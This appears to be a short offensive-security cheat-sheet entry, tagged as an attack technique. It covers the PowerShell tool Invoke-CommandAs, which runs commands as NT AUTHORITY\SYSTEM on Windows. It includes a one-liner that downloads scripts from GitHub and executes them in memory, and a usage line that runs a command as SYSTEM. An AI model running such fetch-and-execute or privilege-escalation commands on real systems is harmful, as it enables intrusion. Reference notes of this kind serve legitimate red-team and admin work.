# Invoke-CommandAs
% windows, impersonation

#plateform/windows #target/local  #cat/ATTACK
## _desc
```
Run command as nt authority\system
```

## _repo
```
```

## _doc
```
https://github.com/mkellerman/Invoke-CommandAs
```

## _install
```
```

## import modules
```powershell
Import-Module ".\Invoke-CommandAs.ps1" ;  Import-Module ".\Invoke-ScheduledTask.ps1" ; 
```

## import one-liner
```powershell
"Public/Invoke-CommandAs.ps1", "Private/Invoke-ScheduledTask.ps1" | % {. ([ScriptBlock]::Create((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/mkellerman/Invoke-CommandAs/master/Invoke-CommandAs/${_}")))}
```

## run commend as system
```powerhell
Invoke-CommandAs -ScriptBlock {<command|whoami>} -AsSystem
```